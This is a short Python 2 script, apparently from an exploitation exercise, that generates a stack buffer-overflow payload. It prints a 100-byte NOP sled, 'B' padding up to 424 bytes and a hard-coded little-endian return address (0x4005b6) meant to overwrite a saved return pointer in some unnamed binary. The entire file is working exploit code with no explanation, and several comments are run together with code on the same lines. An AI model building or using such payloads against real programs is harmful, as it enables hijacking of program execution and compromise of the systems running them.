# payload generator
#!/usr/bin/python## Total payload length
payload_length = 424
## Amount of nops
nop_length = 100
## Controlled memory address to return to in Little Endian format
#return_address = '\xde\xe1\xff\xff\xff\x7f\x00\x00'## Building the nop slide
return_address = '\xb6\x05\x40\x00\x00\x00\x00\x00'##  0x00000000004005b6

nop_slide = "\x90" * nop_length## Building the padding between buffer overflow start and return address
padding = 'B' * (payload_length - nop_length)
print nop_slide + padding + return_address 
